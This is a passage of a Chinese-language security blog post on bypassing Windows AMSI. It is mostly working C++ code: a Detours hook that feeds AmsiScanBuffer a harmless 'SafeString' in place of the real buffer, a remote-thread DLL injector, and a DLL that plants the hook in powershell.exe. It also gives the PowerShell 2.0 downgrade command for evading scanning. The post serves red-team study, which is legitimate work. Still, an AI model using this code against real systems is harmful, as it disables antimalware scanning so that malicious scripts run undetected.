AMSI_RESULT_NOT_DETECTED:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_NOT_DETECTED&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_START:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_BLOCKED_BY_ADMIN_START&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_BLOCKED_BY_ADMIN_END:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_BLOCKED_BY_ADMIN_END&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">case</span> AMSI_RESULT_DETECTED:</span><br><span class="line">        description = <span class="string">&quot;AMSI_RESULT_DETECTED&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">default</span>:</span><br><span class="line">        description = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> description;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Store orignal version of AmsiScanBuffer</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">HRESULT</span><span class="params">(WINAPI* OriginalAmsiScanBuffer)</span><span class="params">(HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="function"><span class="params">    PVOID buffer, ULONG length,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR contentName,</span></span></span><br><span class="line"><span class="function"><span class="params">    HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="function"><span class="params">    AMSI_RESULT* result)</span> </span>= AmsiScanBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Our user controlled AmsiScanBuffer</span></span><br><span class="line">HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,</span><br><span class="line">    PVOID buffer, ULONG length,</span><br><span class="line">    LPCWSTR contentName,</span><br><span class="line">    HAMSISESSION amsiSession,</span><br><span class="line">    AMSI_RESULT* result) &#123;</span><br><span class="line">    <span class="keyword">return</span> OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Sets up detours to hook our function</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">HookAmsi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DetourRestoreAfterWith();</span><br><span class="line">    DetourTransactionBegin();</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourAttach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Undoes the hooking we setup earlier</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">UnhookAmsi</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    DetourUpdateThread(GetCurrentThread());</span><br><span class="line">    DetourDetach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);</span><br><span class="line">    DetourTransactionCommit();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">//Declares variables required for AmsiInitialize, AmsiOpenSession, and AmsiScanBuffer</span></span><br><span class="line">    HAMSICONTEXT amsiContext;</span><br><span class="line">    HRESULT hResult = S_OK;</span><br><span class="line">    AMSI_RESULT res = AMSI_RESULT_CLEAN;</span><br><span class="line">    HAMSISESSION hSession = <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//Declare test case to use</span></span><br><span class="line">    LPCWSTR fname = <span class="string">L&quot;EICAR&quot;</span>;</span><br><span class="line">    BYTE* sample = (BYTE*)EICAR;</span><br><span class="line">    ULONG size = <span class="built_in">strlen</span>(EICAR);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Hooking AmsiScanBuffer&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    HookAmsi();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] AmsiScanBuffer Hooked&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    ZeroMemory(&amp;amsiContext, <span class="keyword">sizeof</span>(amsiContext));</span><br><span class="line"></span><br><span class="line">    hResult = AmsiInitialize(<span class="string">L&quot;AmsiHook&quot;</span>, &amp;amsiContext);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::system_category().message(hResult) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] AmsiInitialize Failed&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hResult = AmsiOpenSession(amsiContext, &amp;hSession);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::system_category().message(hResult) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] AmsiOpenSession Failed&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    hResult = AmsiScanBuffer(amsiContext, sample, size, fname, hSession, &amp;res);</span><br><span class="line">    <span class="keyword">if</span> (hResult != S_OK) &#123;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="built_in">std</span>::system_category().message(hResult) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[-] AmsiScanBuffer Failed &quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">        <span class="keyword">return</span> hResult;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; GetResultDescription(res) &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Unhooking AmsiScanBuffer&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    UnhookAmsi();</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] AmsiScanBuffer Unhooked&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>本地hook成功</p>
+<p><img src="Bypass-AMSI.assets/image-20220216180456785.png" alt="image-20220216180456785"></p>
+<p>现在我们已经可以做到hook AmsiScanBuffer使其返回一个安全的结果。那么现在我们如何阻止AMSI阻塞恶意的powershell呢?答案是代码注入，我们需要将代码注入到AMSI所在的进程中，然后hook函数并返回一个安全消息。</p>
+<h4 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h4><p>我们将要做的是创建一个基本的注射器，然后把dll注入到PowerShell（或插入程序使用AMSI的程序）进程中来对AmsiscanBuffer进行hook。下面的代码引自：<a target="_blank" rel="noopener" href="https://github.com/tomcarver16/SimpleInjector">https://github.com/tomcarver16/SimpleInjector</a></p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;TlHelp32.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">//Opens a handle to process then write to process with LoadLibraryA and execute thread</span></span><br><span class="line"><span class="function">BOOL <span class="title">InjectDll</span><span class="params">(DWORD procID, <span class="keyword">char</span>* dllName)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">char</span> fullDllName[MAX_PATH];</span><br><span class="line">    LPVOID loadLibrary;</span><br><span class="line">    LPVOID remoteString;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (procID == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    HANDLE hProc = <span class="built_in">OpenProcess</span>(PROCESS_ALL_ACCESS, FALSE, procID);</span><br><span class="line">    <span class="keyword">if</span> (hProc == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">        <span class="keyword">return</span> FALSE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">GetFullPathNameA</span>(dllName, MAX_PATH, fullDllName, <span class="literal">NULL</span>);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] Aquired full DLL path: &quot;</span> &lt;&lt; fullDllName &lt;&lt; std::endl;</span><br><span class="line"></span><br><span class="line">    loadLibrary = (LPVOID)<span class="built_in">GetProcAddress</span>(<span class="built_in">GetModuleHandle</span>(<span class="string">&quot;kernel32.dll&quot;</span>), <span class="string">&quot;LoadLibraryA&quot;</span>);</span><br><span class="line">    remoteString = <span class="built_in">VirtualAllocEx</span>(hProc, <span class="literal">NULL</span>, <span class="built_in">strlen</span>(fullDllName), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">WriteProcessMemory</span>(hProc, remoteString, fullDllName, <span class="built_in">strlen</span>(fullDllName), <span class="literal">NULL</span>);</span><br><span class="line">    <span class="built_in">CreateRemoteThread</span>(hProc, <span class="literal">NULL</span>, <span class="literal">NULL</span>, (LPTHREAD_START_ROUTINE)loadLibrary, (LPVOID)remoteString, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">CloseHandle</span>(hProc);</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Iterate all process until the name we&#x27;re searching for matches</span></span><br><span class="line"><span class="comment">//Then return the process ID</span></span><br><span class="line"><span class="function">DWORD <span class="title">GetProcIDByName</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* procName)</span> </span>&#123;</span><br><span class="line">    HANDLE hSnap;</span><br><span class="line">    BOOL done;</span><br><span class="line">    PROCESSENTRY32 procEntry;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">ZeroMemory</span>(&amp;procEntry, <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32));</span><br><span class="line">    procEntry.dwSize = <span class="built_in"><span class="keyword">sizeof</span></span>(PROCESSENTRY32);</span><br><span class="line"></span><br><span class="line">    hSnap = <span class="built_in">CreateToolhelp32Snapshot</span>(TH32CS_SNAPPROCESS, <span class="number">0</span>);</span><br><span class="line">    done = <span class="built_in">Process32First</span>(hSnap, &amp;procEntry);</span><br><span class="line">    <span class="keyword">do</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (_strnicmp(procEntry.szExeFile, procName, <span class="built_in"><span class="keyword">sizeof</span></span>(procEntry.szExeFile)) == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> procEntry.th32ProcessID;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">while</span> (<span class="built_in">Process32Next</span>(hSnap, &amp;procEntry));</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>** argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">char</span>* processName = argv[<span class="number">1</span>];</span><br><span class="line">    <span class="keyword">char</span>* dllName = argv[<span class="number">2</span>];</span><br><span class="line">    DWORD procID = <span class="built_in">GetProcIDByName</span>(processName);</span><br><span class="line">    std::cout &lt;&lt; <span class="string">&quot;[+] Got process ID for &quot;</span> &lt;&lt; processName &lt;&lt; <span class="string">&quot; PID: &quot;</span> &lt;&lt; procID &lt;&lt; std::endl;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">InjectDll</span>(procID, dllName)) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;DLL now injected!&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;DLL couldn&#x27;t be injected&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>现在我们有一个可用的注入器，所以接下来我们要做的就是把我们的可执行文件从早期的exe格式转换成一个dll。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;detours.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;amsi.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib, <span class="meta-string">&quot;amsi.lib&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> SAFE <span class="meta-string">&quot;SafeString&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="title">HRESULT</span><span class="params">(WINAPI* OriginalAmsiScanBuffer)</span><span class="params">(HAMSICONTEXT amsiContext,</span></span></span><br><span class="line"><span class="function"><span class="params">    PVOID buffer, ULONG length,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPCWSTR contentName,</span></span></span><br><span class="line"><span class="function"><span class="params">    HAMSISESSION amsiSession,</span></span></span><br><span class="line"><span class="function"><span class="params">    AMSI_RESULT* result)</span> </span>= AmsiScanBuffer;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Our user controlled AmsiScanBuffer</span></span><br><span class="line">__declspec(dllexport) HRESULT _AmsiScanBuffer(HAMSICONTEXT amsiContext,</span><br><span class="line">    PVOID buffer, ULONG length,</span><br><span class="line">    LPCWSTR contentName,</span><br><span class="line">    HAMSISESSION amsiSession,</span><br><span class="line">    AMSI_RESULT* result) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] AmsiScanBuffer called&quot;</span> &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Buffer &quot;</span> &lt;&lt; buffer &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[+] Buffer Length &quot;</span> &lt;&lt; length &lt;&lt; <span class="built_in">std</span>::<span class="built_in">endl</span>;</span><br><span class="line">    <span class="keyword">return</span> OriginalAmsiScanBuffer(amsiContext, (BYTE*)SAFE, length, contentName, amsiSession, result);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">BOOL APIENTRY <span class="title">DllMain</span><span class="params">(HMODULE hModule,</span></span></span><br><span class="line"><span class="function"><span class="params">    DWORD  dwReason,</span></span></span><br><span class="line"><span class="function"><span class="params">    LPVOID lpReserved</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (DetourIsHelperProcess()) &#123;</span><br><span class="line">        <span class="keyword">return</span> TRUE;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (dwReason == DLL_PROCESS_ATTACH) &#123;</span><br><span class="line">        AllocConsole();</span><br><span class="line">        freopen_s((FILE**)<span class="built_in">stdout</span>, <span class="string">&quot;CONOUT$&quot;</span>, <span class="string">&quot;w&quot;</span>, <span class="built_in">stdout</span>);</span><br><span class="line"></span><br><span class="line">        DetourRestoreAfterWith();</span><br><span class="line">        DetourTransactionBegin();</span><br><span class="line">        DetourUpdateThread(GetCurrentThread());</span><br><span class="line"></span><br><span class="line">        DetourAttach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);</span><br><span class="line">        DetourTransactionCommit();</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dwReason == DLL_PROCESS_DETACH) &#123;</span><br><span class="line">        DetourTransactionBegin();</span><br><span class="line">        DetourUpdateThread(GetCurrentThread());</span><br><span class="line">        DetourDetach(&amp;(PVOID&amp;)OriginalAmsiScanBuffer, _AmsiScanBuffer);</span><br><span class="line">        DetourTransactionCommit();</span><br><span class="line">        FreeConsole();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> TRUE;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>使用注射器将我们的dll注入到powershell.exe的进程中</p>
+<p><img src="Bypass-AMSI.assets/image-20220216183933698.png" alt="image-20220216183933698"></p>
+<p>再次执行敏感字符串，发现已经成功bypass</p>
+<p><img src="Bypass-AMSI.assets/image-20220216184038197.png" alt="image-20220216184038197"></p>
+<p>使用调试器查看进程加载的模块，可以看到bypassamsidll.dll已经注入到powershell的进程中了。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216184310242.png" alt="image-20220216184310242"></p>
+<p>查看AmsiScanBuffer的入口地址可以看到开始的命令已经被jmp 命令覆盖。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216184421063.png" alt="image-20220216184421063"></p>
+<p>继续运行，等到程序重新跳转回AmsiScanBuffer时，rdx（第二个参数）的内容已经变成了“SafeString”，AMSI并没有接收到真正的字符串，因此AMSI也通过这种方法绕过去了。</p>
+<p><img src="Bypass-AMSI.assets/image-20220216185748940.png" alt="image-20220216185748940"></p>
+<h3 id="降低powershell版本"><a href="#降低powershell版本" class="headerlink" title="降低powershell版本"></a>降低powershell版本</h3><p>将powershell版本降到2.0，就能够规避amsi，因为在低版本的powershell中还没有加入amsi。使用下面的命令就可以切换powershell的版本为2.0。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -version 2</span><br></pre></td></tr></table></figure>
+
+<p>可以看到，切换到2.0版本后便绕过了AMSI</p>
+<p><img src="Bypass-AMSI.assets/image-20220215154326587.png" alt="image-20220215154326587"></p>
+<p>PowerShell 2.0 集成在 Windows 7 和 Windows 服务器 2008 R2 以上的所有版本中，但是由于PowerShell 2.0 运行所需的 .NET Framework版本未必已经安装，所以可能会出现如下提示。</p>
+<p><img src="Bypass-AMSI.assets/image-20220215154059390.png" alt="image-20220215154059390"></p>
+<h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/10437#toc-7">https://xz.aliyun.com/t/10437#toc-7</a></p>
+<p><a target="_blank" rel="noopener" href="https://idiotc4t.com/defense-evasion/memory-pacth-bypass-amsi">https://idiotc4t.com/defense-evasion/memory-pacth-bypass-amsi</a></p>
+<p><a target="_blank" rel="noopener" href="https://x64sec.sh/understanding-and-bypassing-amsi/">https://x64sec.sh/understanding-and-bypassing-amsi/</a></p>
+
+	  <div class="article-footer-copyright">
+
+    本博客采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank">知识共享署名-非商业性使用-相同方式共享 4.0 国际许可协议(CC BY-NC-SA 4.0) 发布.</a>
+</div>
+
+	</div>
+
+	
+	<span id="/2022/02/16/Bypass-AMSI/" class="leancloud-visitors view" data-flag-title="Bypass AMSI">
+		<em class="post-meta-item-text"> Page View </em> <i class="leancloud-visitors-count"></i>
+	</span>
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2022/02/09/net程序集内存加载执行技术/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+		<section id="comments" class="comments">
+			<style>
+			.comments{margin:30px;padding:10px;background:rgb(0, 0, 0)}
+			@media screen and (max-width:800px){.comments{margin:auto;padding:10px;background:#000}}
+			</style>
+			<div id="vcomment" class="comment"></div>
+<script src='//unpkg.com/valine/dist/Valine.min.js'></script>
+<script src="https://cdnjs.loli.net/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
+<script>
+var valineConfig = {"enable":true,"appId":"xxx","appKey":"xxx","placeholder":"提交评论时留下邮箱收到回复后将自动通知","visitor":true,"avatar":"monsterid","requiredFields":["nick","mail"]}
+valineConfig.el='#vcomment';
+new Valine(valineConfig);
+    // new Valine({
+    //     el: '#vcomment',
+    //     appId: "",
+    //     appKey: "",
+    //     placeholder: "提交评论时留下邮箱收到回复后将自动通知",
+    //     avatar:"monsterid",
+    //     visitor: "true",
+    //     requiredFields: "nick,mail".split(','),
+    // });
+</script>
+
+		</section>
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2022-02-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/AMSI/">AMSI<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2022 0pen1's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+</body>
+   </html>
